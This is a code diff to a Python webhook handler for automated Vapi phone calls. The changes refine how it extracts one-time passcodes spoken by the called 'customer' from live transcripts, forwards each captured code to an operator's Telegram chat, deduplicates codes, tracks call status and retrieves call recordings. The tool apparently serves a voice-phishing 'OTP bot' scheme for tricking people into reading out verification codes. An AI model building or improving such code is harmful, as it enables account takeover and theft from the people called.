@@ -129,6 +129,11 @@ def handle_vapi_webhook(request) -> Response:
                 _send_live_status(chat_id, "📞 Ringing...")
             elif call_status in ("in-progress", "answered"):
                 _send_live_status(chat_id, "☎️ Live")
+                if call_sid:
+                    from bot import get_call_session
+                    s = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+                    if s:
+                        s["call_was_in_progress"] = True
             elif call_status in ("completed", "failed", "canceled", "ended", "no-answer", "busy", "error"):
                 return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
             return Response("OK")
@@ -145,16 +150,86 @@ def handle_vapi_webhook(request) -> Response:
         return Response("Error", status=500)
 
 
+def _extract_otp_from_messages(
+    messages: list,
+    code_length: int,
+    call_sid: Optional[str],
+    vapi_call_id: Optional[str],
+    chat_id: Optional[int],
+    user_id: Optional[str],
+) -> Optional[str]:
+    for msg in messages:
+        role = msg.get("role", "")
+        if role != "customer":
+            continue
+        text = msg.get("transcript") or msg.get("content") or msg.get("text") or msg.get("message") or ""
+        if not text:
+            continue
+        otp = extract_otp_from_transcript(text, code_length)
+        if otp:
+            logger.info("[VAPI_OTP_DETECTED_ARTIFACT] otp=%s call_sid=%s", otp, call_sid)
+            _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
+            if chat_id and call_sid:
+                from handlers.otp_notifier import notify_otp_captured
+                notify_otp_captured(
+                    chat_id=int(chat_id),
+                    call_sid=call_sid,
+                    user_id=user_id or "unknown",
+                    digits=otp,
+                    vapi_call_id=vapi_call_id,
+                )
+            return otp
+    return None
+
+
 def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
     try:
+        event_type = payload.get("type") or payload.get("event") or ""
         message = payload.get("message", payload)
-        transcript_text = (
-            message.get("transcript")
-            or message.get("text")
-            or message.get("transcription")
-            or ""
-        )
-        role = message.get("role", "assistant")
+
+        transcript_text = ""
+        role = "assistant"
+
+        if event_type in ("transcript", "transcription", "call.transcript"):
+            transcript_text = (
+                message.get("transcript")
+                or message.get("text")
+                or message.get("transcription")
+                or ""
+            )
+            role = message.get("role", "assistant")
+        elif event_type == "speech-update":
+            speech = payload.get("speech", {})
+            transcript_text = (
+                speech.get("transcript")
+                or speech.get("text")
+                or speech.get("transcription")
+                or ""
+            )
+            role = speech.get("role", "assistant")
+        elif event_type == "conversation-update":
+            msgs = payload.get("messages", [])
+            for msg in reversed(msgs):
+                msg_role = msg.get("role", "")
+                if msg_role == "customer":
+                    transcript_text = (
+                        msg.get("transcript")
+                        or msg.get("content")
+                        or msg.get("text")
+                        or msg.get("message")
+                        or ""
+                    )
+                    if transcript_text:
+                        role = "customer"
+                        break
+        else:
+            transcript_text = (
+                message.get("transcript")
+                or message.get("text")
+                or message.get("transcription")
+                or ""
+            )
+            role = message.get("role", "assistant")
 
         metadata = _extract_metadata(payload, call_data)
         code_length = int(metadata.get("code_length", 6))
@@ -170,6 +245,11 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         if role == "customer" and transcript_text:
             otp = extract_otp_from_transcript(transcript_text, code_length)
             if otp:
+                from bot import get_call_session
+                session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+                if session and session.get("otp") == otp:
+                    logger.info("[VAPI_OTP] duplicate OTP %s for call %s, skipping", otp, call_sid)
+                    return Response("OK")
                 logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                 _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
                 if chat_id and call_sid:
@@ -205,21 +285,36 @@ def _extract_recording_url(payload: dict, call_data: Optional[dict] = None) -> O
     return None
 
 
-def _download_recording_file(recording_url: str) -> Optional[bytes]:
-    from config import VAPI_API_KEY
-    for use_auth in [False, True]:
+def _download_recording_file(recording_url: str, vapi_call_id: Optional[str] = None) -> Optional[bytes]:
+    try:
+        resp = requests.get(recording_url, timeout=120)
+        if resp.status_code == 200 and len(resp.content) > 1024:
+            logger.info("[VAPI_RECORDING] download OK size=%s", len(resp.content))
+            return resp.content
+        logger.info("[VAPI_RECORDING] download status=%s size=%s (url=%s)",
+                     resp.status_code, len(resp.content or b""), recording_url[:60])
+    except Exception as e:
+        logger.warning("[VAPI_RECORDING] download error=%s (url=%s)", e, recording_url[:60])
+
+    if vapi_call_id:
         try:
-            headers = {}
-            if use_auth and VAPI_API_KEY and VAPI_API_KEY != "YOUR_VAPI_API_KEY_HERE":
-                headers["Authorization"] = f"Bearer {VAPI_API_KEY}"
-            resp = requests.get(recording_url, headers=headers, timeout=120)
-            if resp.status_code == 200 and len(resp.content) > 1024:
-                logger.info("[VAPI_RECORDING] download OK auth=%s size=%s", use_auth, len(resp.content))
-                return resp.content
-            logger.info("[VAPI_RECORDING] download attempt auth=%s status=%s size=%s",
-                         use_auth, resp.status_code, len(resp.content) if resp.content else 0)
+            from services.vapi_service import get_call
+            call_data = get_call(vapi_call_id)
+            if call_data:
+                fresh_url = (
+                    call_data.get("recordingUrl")
+                    or call_data.get("artifact", {}).get("recordingUrl")
+                )
+                if fresh_url and fresh_url != recording_url:
+                    logger.info("[VAPI_RECORDING] fresh URL from API, retrying download")
+                    resp = requests.get(fresh_url, timeout=120)
+                    if resp.status_code == 200 and len(resp.content) > 1024:
+                        return resp.content
+                    logger.info("[VAPI_RECORDING] fresh URL download status=%s size=%s",
+                                 resp.status_code, len(resp.content or b""))
         except Exception as e:
-            logger.warning("[VAPI_RECORDING] download attempt auth=%s error=%s", use_auth, e)
+            logger.warning("[VAPI_RECORDING] API fallback error=%s", e)
+
     return None
 
 
@@ -282,22 +377,32 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         status = cd.get("status", "completed")
         ended_reason = cd.get("endedReason", "")
 
-        if status == "queued" and ended_reason:
-            reason_to_status = {
-                "customer-ended-call": "completed",
-                "assistant-ended-call": "completed",
-                "customer-did-not-answer": "no-answer",
-                "customer-busy": "busy",
-                "customer-did-not-respond": "completed",
-                "assistant-error": "failed",
-                "pipeline-error": "failed",
-                "silence-timed-out": "completed",
-            }
-            mapped = reason_to_status.get(ended_reason)
-            if mapped:
-                logger.info("[VAPI_CALL_ENDED] remapped status from '%s' to '%s' using endedReason='%s'",
-                             status, mapped, ended_reason)
-                status = mapped
+        from bot import get_call_session
+        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+        if session and session.get("call_ended_processed"):
+            logger.info("[VAPI_CALL_ENDED] already processed for call_sid=%s, skipping duplicate", call_sid)
+            return Response("OK")
+
+        if status == "queued":
+            if session and session.get("call_was_in_progress"):
+                logger.info("[VAPI_CALL_ENDED] call was in-progress, overriding 'queued' status")
+                status = "ended"
+            elif ended_reason:
+                reason_to_status = {
+                    "customer-ended-call": "completed",
+                    "assistant-ended-call": "completed",
+                    "customer-did-not-answer": "no-answer",
+                    "customer-busy": "busy",
+                    "customer-did-not-respond": "completed",
+                    "assistant-error": "failed",
+                    "pipeline-error": "failed",
+                    "silence-timed-out": "completed",
+                }
+                mapped = reason_to_status.get(ended_reason)
+                if mapped:
+                    logger.info("[VAPI_CALL_ENDED] remapped status from '%s' to '%s' using endedReason='%s'",
+                                 status, mapped, ended_reason)
+                    status = mapped
 
         logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s endedReason=%s",
                      call_sid, duration_s, status, ended_reason)
@@ -349,6 +454,9 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
             else:
                 logger.info("[VAPI_CALL_ENDED] no recording url and no vapi_call_id to fetch")
 
+        if session:
+            session["call_ended_processed"] = True
+
         return Response("OK")
     except Exception as e:
         logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
@@ -357,8 +465,13 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
 
 def _fetch_and_send_recording_via_api(vapi_call_id: str, call_sid: Optional[str], chat_id: int, user_id: Optional[str]):
     try:
-        from services.vapi_service import get_call
-        call_data = get_call(vapi_call_id)
+        from services.vapi_service import get_call, VapiError
+        try:
+            call_data = get_call(vapi_call_id)
+        except VapiError as e:
+            logger.error("[VAPI_RECORDING_API] Cannot fetch recording: %s", e)
+            _send_telegram(chat_id, "⚠️ Recording unavailable - Vapi API key not configured.")
+            return
         if not call_data:
             logger.warning("[VAPI_RECORDING_API] get_call returned nothing for %s", vapi_call_id)
             _send_telegram(chat_id, "⚠️ Recording not available via API.")
@@ -381,7 +494,7 @@ def _fetch_and_send_recording_via_api(vapi_call_id: str, call_sid: Optional[str]
 
 def _download_and_send_recording(recording_url: str, call_sid: Optional[str], vapi_call_id: Optional[str], chat_id: int, user_id: Optional[str]):
     _send_live_status(chat_id, "🎙 DL recording...")
-    audio_data = _download_recording_file(recording_url)
+    audio_data = _download_recording_file(recording_url, vapi_call_id)
     if not audio_data:
         logger.error("[VAPI_RECORDING] download failed for %s", recording_url[:80])
         _send_telegram(chat_id, "⚠️ Recording download failed.")
